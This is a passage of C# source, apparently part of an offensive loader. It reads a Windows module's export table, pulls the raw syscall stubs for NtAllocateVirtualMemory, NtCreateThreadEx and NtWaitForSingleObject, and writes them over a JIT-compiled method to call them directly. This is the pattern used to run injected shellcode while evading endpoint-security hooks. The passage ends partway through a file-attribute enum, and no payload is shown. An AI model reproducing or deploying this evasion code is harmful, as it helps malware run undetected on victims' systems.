using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Reflection;
using System.Net.NetworkInformation;
using System.Threading;
using System.Net;
using System.Diagnostics;

namespace BC
{
    public class SyscallTable
    {
          public static List<APITableEntry> Syscall_list { get; set; }

        public SyscallTable()
        {

            APITableEntry v1 = new APITableEntry();
            APITableEntry v2 = new APITableEntry();
            APITableEntry v3 = new APITableEntry();

            v1.Name = "NtAllocateVirtualMemory";
            v2.Name = "NtCreateThreadEx";
            v3.Name = "NtWaitForSingleObject";
			
			Syscall_list = new List<APITableEntry>();
            Syscall_list.Add(v1);
            Syscall_list.Add(v2);
            Syscall_list.Add(v3);

            return;
        }

        public struct APITableEntry
        {
            public string Name;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 24)]
            public byte[] syscall_byte;
        }
    }

    public class SyscallFunctions
    {

        public IntPtr ManagedMethodAddress { get; set; }
        public IntPtr UnmanagedMethodAddress { get; set; }
        private object Mutant { get; set; }
        public SyscallFunctions()
        {
            ManagedMethodAddress= IntPtr.Zero;
            UnmanagedMethodAddress= IntPtr.Zero;
            Mutant = new object();
        }
		
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
        public static UInt32 Gate()
        {
            return new UInt32();
        }

        public bool GenerateRWXMemorySegment()
        {
            // Find and JIT the method
            MethodInfo method = typeof(SyscallFunctions).GetMethod(nameof(Gate), BindingFlags.Static | BindingFlags.NonPublic);
            if (method == null)
            {
                Console.WriteLine("Unable to find the method");
                return false;
            }
            RuntimeHelpers.PrepareMethod(method.MethodHandle);
#if DEBUG
            // Get the address of the function and check if first opcode == JMP
            IntPtr pMethod = method.MethodHandle.GetFunctionPointer();

            Console.WriteLine($"\t[*] Relative Address: 0x{pMethod:X16}");
            Console.Write($"{Marshal.ReadByte(pMethod, -1):X2} # ");
            Console.Write($"{Marshal.ReadByte(pMethod, 0):X2}");
            Console.Write($"{Marshal.ReadByte(pMethod, 1):X2}");
            Console.Write($"{Marshal.ReadByte(pMethod, 2):X2}");
            Console.Write($"{Marshal.ReadByte(pMethod, 3):X2}");
            Console.Write($"{Marshal.ReadByte(pMethod, 4):X2}");
            Console.Write($"{Marshal.ReadByte(pMethod, 5):X2}");
            Console.Write($"{Marshal.ReadByte(pMethod, 6):X2}");
            Console.Write($"{Marshal.ReadByte(pMethod, 7):X2}");
            Console.Write($" # {Marshal.ReadByte(pMethod, 8):X2}");

            if (Marshal.ReadByte(pMethod) != 0xe9)
            {
                Console.WriteLine("Method was not JIT'ed or invalid stub");
                return false;
            }

            // Get address of jited method and stack alignment 
            Int32 offset = Marshal.ReadInt32(pMethod, 1);
            UInt64 addr = (UInt64)pMethod + (UInt64)offset;

            int count = 0;
            while (addr % 16 != 0)
            {
                count++;
                addr++;
            }
            Console.WriteLine("\nCount = " + count);

            this.UnmanagedMethodAddress = (IntPtr)addr;
# else
            this.ManagedMethodAddress = method.MethodHandle.GetFunctionPointer();
# endif
            return true;
        }

        private T NtInvocation<T>(byte[] Syscall_byte) 
        {
            if (Syscall_byte.Length == 0)
            {
                Console.WriteLine("Syscall byte is null");
            }

            IntPtr Desitnation_address = IntPtr.Zero;

# if DEBUG
            Desitnation_address = this.UnmanagedMethodAddress;
# else
            Desitnation_address = this.ManagedMethodAddress;
# endif

            Marshal.Copy(Syscall_byte, 0, Desitnation_address, Syscall_byte.Length);
            return Marshal.GetDelegateForFunctionPointer<T>(Desitnation_address);
        }

        public UInt32 NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect)
        {
            lock (this.Mutant)
            {
                byte[] syscall = new byte[24];
                foreach (var temp in SyscallTable.Syscall_list)
                {
                    if (temp.Name.ToLower() == "NtAllocateVirtualMemory".ToLower())
                    {
                        syscall = temp.syscall_byte;
                    }
                }

                SyscallDelegates.NtAllocateVirtualMemory Func = NtInvocation<SyscallDelegates.NtAllocateVirtualMemory>(syscall);
                return Func(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
            }
        }

        public UInt32 NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer)
        {
            lock (this.Mutant)
            {
                byte[] syscall = new byte[24];
                foreach (var temp in SyscallTable.Syscall_list)
                {
                    if (temp.Name.ToLower() == "NtCreateThreadEx".ToLower())
                    {
                        syscall = temp.syscall_byte;
                    }
                }

                SyscallDelegates.NtCreateThreadEx Func = NtInvocation<SyscallDelegates.NtCreateThreadEx>(syscall);
                return Func(out hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, CreateSuspended, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
            }
        }

        public UInt32 NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)
        {
            lock (this.Mutant)
            {
                byte[] syscall = new byte[24];
                foreach (var temp in SyscallTable.Syscall_list)
                {
                    if (temp.Name.ToLower() == "NtWaitForSingleObject".ToLower())
                    {
                        syscall = temp.syscall_byte;
                    }
                }

                SyscallDelegates.NtWaitForSingleObject Func = NtInvocation<SyscallDelegates.NtWaitForSingleObject>(syscall);
                return Func(Object, Alertable, Timeout);
            }
        }
    }

   public  class SyscallDelegates
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            ulong AllocationType,
            ulong Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtCreateThreadEx(
            out IntPtr hThread,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            bool CreateSuspended,
            uint StackZeroBits,
            uint SizeOfStackCommit,
            uint SizeOfStackReserve,
            IntPtr lpBytesBuffer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout);
    }

     class ModuleUtil
    {

        public static NativeStructs.IMAGE_SECTION_HEADER[] GetSectionArray(
            MemoryStream ModuleStream,
            NativeStructs.IMAGE_FILE_HEADER IMAGE_FILE_HEADER_instance,
            NativeStructs.IMAGE_DOS_HEADER IMAGE_DOS_HEADER_instance,
            NativeStructs.IMAGE_NT_HEADER64 IMAGE_NT_HEADER64_instance)
        {
            NativeStructs.IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER_instance = new NativeStructs.IMAGE_SECTION_HEADER();
            NativeStructs.IMAGE_SECTION_HEADER[] IMAGE_SECTION_HEADER_array = new NativeStructs.IMAGE_SECTION_HEADER[IMAGE_FILE_HEADER_instance.NumberOfSections];

            for (Int16 count = 0; count < IMAGE_FILE_HEADER_instance.NumberOfSections; count++)
            {

                Int64 Section_offset = GetModuleSectionOffset(count, IMAGE_DOS_HEADER_instance, IMAGE_NT_HEADER64_instance);

                IMAGE_SECTION_HEADER_instance = (NativeStructs.IMAGE_SECTION_HEADER)MemoryUtil.GetStructureFromBlob(
                    ModuleStream, Section_offset,
                    Marshal.SizeOf(IMAGE_SECTION_HEADER_instance),
                    IMAGE_SECTION_HEADER_instance);

                IMAGE_SECTION_HEADER_array[count] = IMAGE_SECTION_HEADER_instance;
                Console.WriteLine(IMAGE_SECTION_HEADER_instance.SectionName);
            }

            // Console.WriteLine(IMAGE_FILE_HEADER_instance.NumberOfSections);



            return IMAGE_SECTION_HEADER_array;
        }


        private static Int64 GetModuleSectionOffset(Int16 count, NativeStructs.IMAGE_DOS_HEADER IMAGE_DOS_HEADER_instance, NativeStructs.IMAGE_NT_HEADER64 IMAGE_NT_HEADER64_instance)
        {
            Int64 Section_offset = IMAGE_DOS_HEADER_instance.e_lfanew
                + Marshal.SizeOf(typeof(NativeStructs.IMAGE_FILE_HEADER))
                + IMAGE_NT_HEADER64_instance.FileHeader.SizeOfOptionalHeader
                + sizeof(Int32) // sizeof(DWORD)
                + (Marshal.SizeOf(typeof(NativeStructs.IMAGE_SECTION_HEADER)) * count);

            return Section_offset;
        }

        public static NativeStructs.IMAGE_SECTION_HEADER GetSectionByRVA(Int64 rva, NativeStructs.IMAGE_SECTION_HEADER[] IMAGE_SECTION_HEADER_array)
        {
            // this.ModuleSectionHeaders.Where(x => rva > x.VirtualAddress && rva <= x.VirtualAddress + x.SizeOfRawData).First();

            for (int count = 0; count < IMAGE_SECTION_HEADER_array.Count(); count++)
            {
                if (rva > IMAGE_SECTION_HEADER_array[count].VirtualAddress &&
                    rva <= IMAGE_SECTION_HEADER_array[count].VirtualAddress + IMAGE_SECTION_HEADER_array[count].SizeOfRawData)
                {
                    return IMAGE_SECTION_HEADER_array[count];
                }
            }

            NativeStructs.IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER_instance = new NativeStructs.IMAGE_SECTION_HEADER();
            return IMAGE_SECTION_HEADER_instance;
        }

        public static Int64 ConvertRvaToOffset(Int64 rva, NativeStructs.IMAGE_SECTION_HEADER[] IMAGE_SECTION_HEADER_array)
        {
            NativeStructs.IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER_instance = GetSectionByRVA(rva, IMAGE_SECTION_HEADER_array);

            Int64 offset = rva - IMAGE_SECTION_HEADER_instance.VirtualAddress + IMAGE_SECTION_HEADER_instance.PointerToRawData;
            return offset;
        }

        public static void SetSyscallTable(string ModulePath)
        {
            MemoryStream ModuleStream = MemoryUtil.LoadModule(ModulePath);
            int IMAGE_DIRECTORY_ENTRY_EXPORT = 0;

            NativeStructs.IMAGE_DOS_HEADER IMAGE_DOS_HEADER_instance = new NativeStructs.IMAGE_DOS_HEADER();
            IMAGE_DOS_HEADER_instance = (NativeStructs.IMAGE_DOS_HEADER)MemoryUtil.GetStructureFromBlob(
                ModuleStream,
                0,
                Marshal.SizeOf(IMAGE_DOS_HEADER_instance),
                IMAGE_DOS_HEADER_instance);

            NativeStructs.IMAGE_NT_HEADER64 IMAGE_NT_HEADER64_instance = new NativeStructs.IMAGE_NT_HEADER64();
            IMAGE_NT_HEADER64_instance = (NativeStructs.IMAGE_NT_HEADER64)MemoryUtil.GetStructureFromBlob(
                ModuleStream,
                IMAGE_DOS_HEADER_instance.e_lfanew,
                Marshal.SizeOf(IMAGE_NT_HEADER64_instance),
                IMAGE_NT_HEADER64_instance);

            NativeStructs.IMAGE_FILE_HEADER IMAGE_FILE_HEADER_instance = IMAGE_NT_HEADER64_instance.FileHeader;
            NativeStructs.IMAGE_SECTION_HEADER[] IMAGE_SECTION_HEADER_array = new NativeStructs.IMAGE_SECTION_HEADER[IMAGE_FILE_HEADER_instance.NumberOfSections];
            IMAGE_SECTION_HEADER_array = GetSectionArray(
                ModuleStream,
                IMAGE_FILE_HEADER_instance,
                IMAGE_DOS_HEADER_instance,
                IMAGE_NT_HEADER64_instance);

            NativeStructs.IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY_instance = IMAGE_NT_HEADER64_instance.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            // Console.WriteLine(IMAGE_DATA_DIRECTORY_instance.VirtualAddress);

            NativeStructs.IMAGE_EXPORT_DIRECTORY IMAGE_EXPORT_DIRECTORY_instance = new NativeStructs.IMAGE_EXPORT_DIRECTORY();
            IMAGE_EXPORT_DIRECTORY_instance = (NativeStructs.IMAGE_EXPORT_DIRECTORY)MemoryUtil.GetStructureFromBlob(
                ModuleStream,
                ConvertRvaToOffset(IMAGE_DATA_DIRECTORY_instance.VirtualAddress, IMAGE_SECTION_HEADER_array),
                Marshal.SizeOf(IMAGE_EXPORT_DIRECTORY_instance),
                IMAGE_EXPORT_DIRECTORY_instance);

            SetSyscallBytes(ModuleStream, IMAGE_EXPORT_DIRECTORY_instance, IMAGE_SECTION_HEADER_array);

        }

        private static void SetSyscallBytes(
            MemoryStream ModuleStream,
            NativeStructs.IMAGE_EXPORT_DIRECTORY IMAGE_EXPORT_DIRECTORY_instance,
            NativeStructs.IMAGE_SECTION_HEADER[] IMAGE_SECTION_HEADER_array)
        {
            Int64 AddressOfFunctions_offset = ConvertRvaToOffset(IMAGE_EXPORT_DIRECTORY_instance.AddressOfFunctions, IMAGE_SECTION_HEADER_array);
            Int64 AddressOfNameOrdinals_offset = ConvertRvaToOffset(IMAGE_EXPORT_DIRECTORY_instance.AddressOfNameOrdinals, IMAGE_SECTION_HEADER_array);
            Int64 AddressOfNames_offset = ConvertRvaToOffset(IMAGE_EXPORT_DIRECTORY_instance.AddressOfNames, IMAGE_SECTION_HEADER_array);

            SyscallTable Syscall_table = new SyscallTable();

            UInt32 NumberOfNames = IMAGE_EXPORT_DIRECTORY_instance.NumberOfNames;

            for (int iterate_num = 0; iterate_num < NumberOfNames; iterate_num++)
            {
                UInt32 AddressOfNames_single_rva = MemoryUtil.ReadInt32FromStream(ModuleStream, AddressOfNames_offset + iterate_num * 4);
                Int64 AddressOfNames_single_offset = ConvertRvaToOffset(AddressOfNames_single_rva, IMAGE_SECTION_HEADER_array);

                string FuncName_temp = MemoryUtil.ReadAscStrFromStream(ModuleStream, AddressOfNames_single_offset);
                // Console.WriteLine(Func_name);

                for (int index = 0; index < SyscallTable.Syscall_list.Count(); index++)
                {
                    if (FuncName_temp.ToLower() == SyscallTable.Syscall_list[index].Name.ToLower())
                    {
                        UInt16 AddressOfNamesOrdinals_single_offset = MemoryUtil.ReadInt16FromStream(
                            ModuleStream,
                            AddressOfNameOrdinals_offset + 2 * iterate_num);

                        Console.WriteLine(AddressOfNamesOrdinals_single_offset);

                        UInt32 AddressOfFunctions_single_rva = MemoryUtil.ReadInt32FromStream(
                            ModuleStream, AddressOfFunctions_offset + 4 * AddressOfNamesOrdinals_single_offset);

                        Int64 AddressOfFunctions_single_offset = ConvertRvaToOffset(AddressOfFunctions_single_rva, IMAGE_SECTION_HEADER_array);

                        byte[] Syscall_byte = new byte[24];
                        Syscall_byte = MemoryUtil.ReadSyscallFromStream(ModuleStream, AddressOfFunctions_single_offset);

                        SyscallTable.APITableEntry APITableEntry_instance = SyscallTable.Syscall_list[index];
                        APITableEntry_instance.Name = SyscallTable.Syscall_list[index].Name;
                        APITableEntry_instance.syscall_byte = Syscall_byte;
                        SyscallTable.Syscall_list[index] = APITableEntry_instance;

                        for (int temp_num = 0; temp_num < Syscall_byte.Length; temp_num++)
                        {
                            Console.Write("{0} ", Syscall_byte[temp_num].ToString("x2"));

                        }
                        Console.Write("\n");
                    }
                }
            }
        }
    }

    public class MemoryUtil
    {
        public static MemoryStream LoadModule(string ModulePath)
        {
            byte[] ModuleBlob = File.ReadAllBytes(ModulePath);
            if (ModuleBlob.Length == 0x00)
            {
                Console.WriteLine("Empty module content: " + ModulePath);
                return null;
            }

            MemoryStream ModuleStream = new MemoryStream(ModuleBlob.ToArray());
            return ModuleStream;
        }

        public static Object GetStructureFromBlob(MemoryStream ModuleStream, Int64 offset, int TypeSize, Object Object_instance)
        {
            byte[] bytes = GetStructureBytesFromOffset(ModuleStream, offset, TypeSize);
            if (Marshal.SizeOf(Object_instance) != bytes.Length)
                return default;

            IntPtr ptr = Marshal.AllocHGlobal(TypeSize);
            Marshal.Copy(bytes.ToArray(), 0, ptr, bytes.Length);
            Object Temp_instance = Marshal.PtrToStructure(ptr, Object_instance.GetType());

            Marshal.FreeHGlobal(ptr);
            return Temp_instance;
        }

        public static byte[] GetStructureBytesFromOffset(MemoryStream ModuleStream, Int64 offset, int TypeSize)
        {
            byte[] s = new byte[TypeSize];
            ModuleStream.Seek(offset, SeekOrigin.Begin);
            ModuleStream.Read(s, 0, TypeSize);
            return s;
        }

        public static UInt16 ReadInt16FromStream(MemoryStream ModuleStream, Int64 offset)
        {
            byte[] s = new byte[2];
            ModuleStream.Seek(offset, SeekOrigin.Begin);
            ModuleStream.Read(s, 0, 2);
            return BitConverter.ToUInt16(s, 0);
        }

        public static UInt32 ReadInt32FromStream(MemoryStream ModuleStream, Int64 offset)
        {
            byte[] s = new byte[4];
            ModuleStream.Seek(offset, SeekOrigin.Begin);
            ModuleStream.Read(s, 0, 4);
            return BitConverter.ToUInt32(s, 0);
        }

        public static byte[] ReadSyscallFromStream(MemoryStream ModuleStream, Int64 offset)
        {
            byte[] s = new byte[24];
            ModuleStream.Seek(offset, SeekOrigin.Begin);
            ModuleStream.Read(s, 0, 24);
            return s;
        }

        public static string ReadAscStrFromStream(MemoryStream ModuleStream, Int64 offset)
        {
            int length = 0;
            ModuleStream.Seek(offset, SeekOrigin.Begin);
            while (ModuleStream.ReadByte() != 0x00)
                length++;

            byte[] s = new byte[length];
            ModuleStream.Seek(offset, SeekOrigin.Begin);
            ModuleStream.Read(s, 0, length);
            return Encoding.ASCII.GetString(s);
        }
    }

    public class NativeStructs
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public char[] e_magic;       // Magic number
            public UInt16 e_cblp;    // Bytes on last page of file
            public UInt16 e_cp;      // Pages in file
            public UInt16 e_crlc;    // Relocations
            public UInt16 e_cparhdr;     // Size of header in paragraphs
            public UInt16 e_minalloc;    // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;    // Maximum extra paragraphs needed
            public UInt16 e_ss;      // Initial (relative) SS value
            public UInt16 e_sp;      // Initial SP value
            public UInt16 e_csum;    // Checksum
            public UInt16 e_ip;      // Initial IP value
            public UInt16 e_cs;      // Initial (relative) CS value
            public UInt16 e_lfarlc;      // File address of relocation table
            public UInt16 e_ovno;    // Overlay number
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public UInt16[] e_res1;    // Reserved words
            public UInt16 e_oemid;       // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;     // OEM information; e_oemid specific
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public UInt16[] e_res2;    // Reserved words
            public Int32 e_lfanew;      // File address of new exe header
        }

        [StructLayout(LayoutKind.Explicit, Size = 22)]
        public struct IMAGE_NT_HEADER64
        {
            [FieldOffset(0)]
            public UInt32 Signature;
            [FieldOffset(4)]
            public IMAGE_FILE_HEADER FileHeader;
            [FieldOffset(24)]
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }


        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            [FieldOffset(112)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_EXPORT_DIRECTORY
        {
            public UInt32 Characteristics;
            public UInt32 TimeDateStamp;
            public UInt16 MajorVersion;
            public UInt16 MinorVersion;
            public UInt32 Name;
            public UInt32 Base;
            public UInt32 NumberOfFunctions;
            public UInt32 NumberOfNames;
            public UInt32 AddressOfFunctions;     // RVA from base of image
            public UInt32 AddressOfNames;     // RVA from base of image
            public UInt32 AddressOfNameOrdinals;  // RVA from base of image
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;

            [FieldOffset(8)]
            public UInt32 VirtualSize;

            [FieldOffset(12)]
            public UInt32 VirtualAddress;

            [FieldOffset(16)]
            public UInt32 SizeOfRawData;

            [FieldOffset(20)]
            public UInt32 PointerToRawData;

            [FieldOffset(24)]
            public UInt32 PointerToRelocations;

            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;

            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;

            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;

            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string SectionName
            {
                get { return new string(Name); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;  // 4 + 12 + 4  20
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        public enum DataSectionFlags : uint
        {
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeReg = 0x00000000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeDsect = 0x00000001,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeNoLoad = 0x00000002,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeGroup = 0x00000004,
            /// <summary>
            /// The section should not be padded to the next boundary. This flag is obsolete and is replaced by IMAGE_SCN_ALIGN_1BYTES. This is valid only for object files.
            /// </summary>
            TypeNoPadded = 0x00000008,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeCopy = 0x00000010,
            /// <summary>
            /// The section contains executable code.
            /// </summary>
            ContentCode = 0x00000020,
            /// <summary>
            /// The section contains initialized data.
            /// </summary>
            ContentInitializedData = 0x00000040,
            /// <summary>
            /// The section contains uninitialized data.
            /// </summary>
            ContentUninitializedData = 0x00000080,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            LinkOther = 0x00000100,
            /// <summary>
            /// The section contains comments or other information. The .drectve section has this type. This is valid for object files only.
            /// </summary>
            LinkInfo = 0x00000200,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeOver = 0x00000400,
            /// <summary>
            /// The section will not become part of the image. This is valid only for object files.
            /// </summary>
            LinkRemove = 0x00000800,
            /// <summary>
            /// The section contains COMDAT data. For more information, see section 5.5.6, COMDAT Sections (Object Only). This is valid only for object files.
            /// </summary>
            LinkComDat = 0x00001000,
            /// <summary>
            /// Reset speculative exceptions handling bits in the TLB entries for this section.
            /// </summary>
            NoDeferSpecExceptions = 0x00004000,
            /// <summary>
            /// The section contains data referenced through the global pointer (GP).
            /// </summary>
            RelativeGP = 0x00008000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            MemPurgeable = 0x00020000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            Memory16Bit = 0x00020000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            MemoryLocked = 0x00040000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            MemoryPreload = 0x00080000,
            /// <summary>
            /// Align data on a 1-byte boundary. Valid only for object files.
            /// </summary>
            Align1Bytes = 0x00100000,
            /// <summary>
            /// Align data on a 2-byte boundary. Valid only for object files.
            /// </summary>
            Align2Bytes = 0x00200000,
            /// <summary>
            /// Align data on a 4-byte boundary. Valid only for object files.
            /// </summary>
            Align4Bytes = 0x00300000,
            /// <summary>
            /// Align data on an 8-byte boundary. Valid only for object files.
            /// </summary>
            Align8Bytes = 0x00400000,
            /// <summary>
            /// Align data on a 16-byte boundary. Valid only for object files.
            /// </summary>
            Align16Bytes = 0x00500000,
            /// <summary>
            /// Align data on a 32-byte boundary. Valid only for object files.
            /// </summary>
            Align32Bytes = 0x00600000,
            /// <summary>
            /// Align data on a 64-byte boundary. Valid only for object files.
            /// </summary>
            Align64Bytes = 0x00700000,
            /// <summary>
            /// Align data on a 128-byte boundary. Valid only for object files.
            /// </summary>
            Align128Bytes = 0x00800000,
            /// <summary>
            /// Align data on a 256-byte boundary. Valid only for object files.
            /// </summary>
            Align256Bytes = 0x00900000,
            /// <summary>
            /// Align data on a 512-byte boundary. Valid only for object files.
            /// </summary>
            Align512Bytes = 0x00A00000,
            /// <summary>
            /// Align data on a 1024-byte boundary. Valid only for object files.
            /// </summary>
            Align1024Bytes = 0x00B00000,
            /// <summary>
            /// Align data on a 2048-byte boundary. Valid only for object files.
            /// </summary>
            Align2048Bytes = 0x00C00000,
            /// <summary>
            /// Align data on a 4096-byte boundary. Valid only for object files.
            /// </summary>
            Align4096Bytes = 0x00D00000,
            /// <summary>
            /// Align data on an 8192-byte boundary. Valid only for object files.
            /// </summary>
            Align8192Bytes = 0x00E00000,
            /// <summary>
            /// The section contains extended relocations.
            /// </summary>
            LinkExtendedRelocationOverflow = 0x01000000,
            /// <summary>
            /// The section can be discarded as needed.
            /// </summary>
            MemoryDiscardable = 0x02000000,
            /// <summary>
            /// The section cannot be cached.
            /// </summary>
            MemoryNotCached = 0x04000000,
            /// <summary>
            /// The section is not pageable.
            /// </summary>
            MemoryNotPaged = 0x08000000,
            /// <summary>
            /// The section can be shared in memory.
            /// </summary>
            MemoryShared = 0x10000000,
            /// <summary>
            /// The section can be executed as code.
            /// </summary>
            MemoryExecute = 0x20000000,
            /// <summary>
            /// The section can be read.
            /// </summary>
            MemoryRead = 0x40000000,
            /// <summary>
            /// The section can be written to.
            /// </summary>
            MemoryWrite = 0x80000000
        }


        [Flags]
        public enum EFileAccess : uint
        {
            //
            // Standart Section
            //

            AccessSystemSecurity = 0x1000000,   // AccessSystemAcl access type
            MaximumAllowed = 0x2000000,     // MaximumAllowed access type

            Delete = 0x10000,
            ReadControl = 0x20000,
            WriteDAC = 0x40000,
            WriteOwner = 0x80000,
            Synchronize = 0x100000,

            StandardRightsRequired = 0xF0000,
            StandardRightsRead = ReadControl,
            StandardRightsWrite = ReadControl,
            StandardRightsExecute = ReadControl,
            StandardRightsAll = 0x1F0000,
            SpecificRightsAll = 0xFFFF,

            FILE_READ_DATA = 0x0001,        // file & pipe
            FILE_LIST_DIRECTORY = 0x0001,       // directory
            FILE_WRITE_DATA = 0x0002,       // file & pipe
            FILE_ADD_FILE = 0x0002,         // directory
            FILE_APPEND_DATA = 0x0004,      // file
            FILE_ADD_SUBDIRECTORY = 0x0004,     // directory
            FILE_CREATE_PIPE_INSTANCE = 0x0004, // named pipe
            FILE_READ_EA = 0x0008,          // file & directory
            FILE_WRITE_EA = 0x0010,         // file & directory
            FILE_EXECUTE = 0x0020,          // file
            FILE_TRAVERSE = 0x0020,         // directory
            FILE_DELETE_CHILD = 0x0040,     // directory
            FILE_READ_ATTRIBUTES = 0x0080,      // all
            FILE_WRITE_ATTRIBUTES = 0x0100,     // all

            //
            // Generic Section
            //

            GenericRead = 0x80000000,
            GenericWrite = 0x40000000,
            GenericExecute = 0x20000000,
            GenericAll = 0x10000000,

            SPECIFIC_RIGHTS_ALL = 0x00FFFF,
            FILE_ALL_ACCESS =
            StandardRightsRequired |
            Synchronize |
            0x1FF,

            FILE_GENERIC_READ =
            StandardRightsRead |
            FILE_READ_DATA |
            FILE_READ_ATTRIBUTES |
            FILE_READ_EA |
            Synchronize,

            FILE_GENERIC_WRITE =
            StandardRightsWrite |
            FILE_WRITE_DATA |
            FILE_WRITE_ATTRIBUTES |
            FILE_WRITE_EA |
            FILE_APPEND_DATA |
            Synchronize,

            FILE_GENERIC_EXECUTE =
            StandardRightsExecute |
              FILE_READ_ATTRIBUTES |
              FILE_EXECUTE |
              Synchronize
        }

        [Flags]
        public enum EFileShare : uint
        {
            /// <summary>
            /// 
            /// </summary>
            None = 0x00000000,
            /// <summary>
            /// Enables subsequent open operations on an object to request read access. 
            /// Otherwise, other processes cannot open the object if they request read access. 
            /// If this flag is not specified, but the object has been opened for read access, the function fails.
            /// </summary>
            Read = 0x00000001,
            /// <summary>
            /// Enables subsequent open operations on an object to request write access. 
            /// Otherwise, other processes cannot open the object if they request write access. 
            /// If this flag is not specified, but the object has been opened for write access, the function fails.
            /// </summary>
            Write = 0x00000002,
            /// <summary>
            /// Enables subsequent open operations on an object to request delete access. 
            /// Otherwise, other processes cannot open the object if they request delete access.
            /// If this flag is not specified, but the object has been opened for delete access, the function fails.
            /// </summary>
            Delete = 0x00000004
        }

        public enum EFileMode : uint
        {
            /// <summary>
            /// Creates a new file. The function fails if a specified file exists.
            /// </summary>
            New = 1,
            /// <summary>
            /// Creates a new file, always. 
            /// If a file exists, the function overwrites the file, clears the existing attributes, combines the specified file attributes, 
            /// and flags with FILE_ATTRIBUTE_ARCHIVE, but does not set the security descriptor that the SECURITY_ATTRIBUTES structure specifies.
            /// </summary>
            CreateAlways = 2,
            /// <summary>
            /// Opens a file. The function fails if the file does not exist. 
            /// </summary>
            OpenExisting = 3,
            /// <summary>
            /// Opens a file, always. 
            /// If a file does not exist, the function creates a file as if dwCreationDisposition is CREATE_NEW.
            /// </summary>
            OpenAlways = 4,
            /// <summary>
            /// Opens a file and truncates it so that its size is 0 (zero) bytes. The function fails if the file does not exist.
            /// The calling process must open the file with the GENERIC_WRITE access right. 
            /// </summary>
            TruncateExisting = 5
        }

        [Flags]
        public enum EFileAttributes : uint
        {
            Readonly = 0x00000001,
            Hidden = 0x00000002,
            System = 0x00000004,
            Directory = 0x00000010,
            Archive = 0x00000020,
            Device = 0x00000040,
            Normal = 0x00000080,
            Temporary = 0x00000100,
            SparseFile = 0x00000200,
            ReparsePoint = 0x00000400,
            Compressed = 0x00000800,
            Offline = 0x00001000,
            NotContentIndexed = 0x00002000,
            Encrypted = 0x00004000,
            Write_Through = 0x80000000,
            Overlapped = 0x40000000,
            NoBuffering = 0x20000000,
            RandomAccess = 0x10000000,
            SequentialScan = 0x08000000,
            DeleteOnClose = 0x04000000,
            BackupSemantics = 0x02000000,
            PosixSemantics = 0x01000000,
            OpenReparsePoint = 0x00200000,
